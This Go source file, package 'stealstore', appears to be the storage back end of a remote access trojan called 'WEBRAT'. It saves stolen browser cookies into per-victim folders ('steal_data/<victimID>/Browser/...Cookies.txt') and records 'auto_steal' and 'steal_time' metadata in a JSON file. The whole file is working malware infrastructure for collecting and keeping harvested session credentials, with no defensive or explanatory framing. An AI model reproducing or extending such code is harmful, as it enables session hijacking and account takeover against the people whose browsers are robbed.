package stealstore

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func DataDir(victimID string) string {
	base := strings.TrimSpace(os.Getenv("WEBRAT_STEAL_DIR"))
	if base == "" {
		wd, _ := os.Getwd()
		base = filepath.Join(wd, "steal_data")
	}
	return filepath.Join(base, victimID)
}

func SaveResult(victimID string, browserName string, cookies string) error {
	dir := filepath.Join(DataDir(victimID), "Browser")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return err
	}

	fname := strings.ReplaceAll(browserName, " ", "") + "Cookies.txt"
	return os.WriteFile(filepath.Join(dir, fname), []byte(cookies), 0o644)
}

func UpdateMeta(victimID, autoSteal string) error {
	dir := DataDir(victimID)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return err
	}

	metaPath := filepath.Join(dir, "meta.json")

	meta := map[string]string{
		"auto_steal": autoSteal,
		"steal_time": time.Now().Format("02.01.2006, 15:04:05"),
	}

	existing, err := os.ReadFile(metaPath)
	if err == nil {
		var old map[string]string
		if json.Unmarshal(existing, &old) == nil {
			if autoSteal == "" && old["auto_steal"] != "" {
				meta["auto_steal"] = old["auto_steal"]
			}
		}
	}

	data, err := json.MarshalIndent(meta, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(metaPath, data, 0o644)
}
